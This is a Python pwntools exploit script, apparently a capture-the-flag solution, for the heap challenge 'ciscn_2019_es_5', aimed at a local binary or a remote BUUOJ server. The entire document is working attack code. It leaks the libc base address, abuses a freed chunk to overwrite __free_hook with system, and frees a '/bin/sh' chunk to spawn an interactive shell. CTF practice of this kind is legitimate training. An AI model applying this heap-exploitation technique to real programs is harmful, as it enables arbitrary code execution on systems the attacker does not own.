import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./ciscn_2019_es_5')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./ciscn_2019_es_5')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',28071)
			elf=ELF('./ciscn_2019_es_5')
			libc=ELF('../../x64libc/libc.so.6')

		def add(a,b):
			io.sendlineafter('Your choice:','1')
			io.sendlineafter('size?>',str(a))
			io.sendafter('content:',b)

		def delete(a):
			io.sendlineafter('Your choice:','4')
			io.sendlineafter('Index:',str(a))

		def edit(a,c):
			io.sendlineafter('Your choice:','2')
			io.sendlineafter('Index:',str(a))
			io.sendafter('content:',c)

		def show(a):
			io.sendlineafter('Your choice:','3')
			io.sendlineafter('Index:',str(a))
		

		add(0x500,'a')
		add(0x40,'/bin/sh\x00')
		delete(0)
		add(0x500,'00000000')
		show(0)
		io.recvuntil('0'*8)
		libc_base=u64(io.recv(6)+'\x00\x00')-96-0x10-libc.sym['__malloc_hook']
		libc.address=libc_base
		io.sendlineafter('Your choice:','1')
		io.sendlineafter('size?>','\x40')
		io.sendafter('content:','1111')
		io.sendlineafter('Your choice:','2')
		io.sendlineafter('Index:',str(2))
		delete(2)
		add(0x8,p64(libc.sym['__free_hook']))
		add(0x8,p64(libc.sym['system']))
		delete(1)





		success('libc_base:'+hex(libc_base))
		#gdb.attach(io)
		#pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue